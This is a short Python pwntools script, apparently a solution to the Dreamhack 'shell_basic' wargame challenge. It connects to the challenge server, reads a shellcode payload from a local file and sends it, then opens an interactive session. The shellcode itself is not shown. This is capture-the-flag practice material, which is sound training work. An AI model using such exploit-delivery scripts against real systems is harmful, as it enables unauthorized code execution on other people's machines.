from pwn import *

#p = process("./shell_basic")
p = remote('host1.dreamhack.games', 19840)

data = p.recvuntil('shellcode:')

f = open("save", "rb")

payload=f.read()
f.close()

p.sendline(payload)

p.interactive()